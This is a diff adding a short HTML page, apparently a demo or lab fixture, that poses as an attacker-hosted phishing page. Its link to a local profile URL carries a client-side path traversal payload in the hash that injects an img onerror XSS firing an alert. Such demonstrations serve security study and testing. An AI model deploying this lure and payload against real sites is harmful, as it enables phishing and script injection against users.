@@ -1,0 +1,10 @@
+<!doctype html>
+<html>
+<body>
+<h1>Check out this cool profile!</h1>
+<p>Hey, look at <a href="http://localhost:5083/profile.html#../echo?data=%3Cimg%20src=x%20onerror=%22alert('XSS%20via%20CSPT')%22%3E">Alice's new bio</a>.</p>
+<p>(Attacker-hosted phishing page. The link looks like a normal profile
+URL on the target site but the hash contains a client-side path traversal
+payload that hijacks the fetch and fires XSS.)</p>
+</body>
+</html>
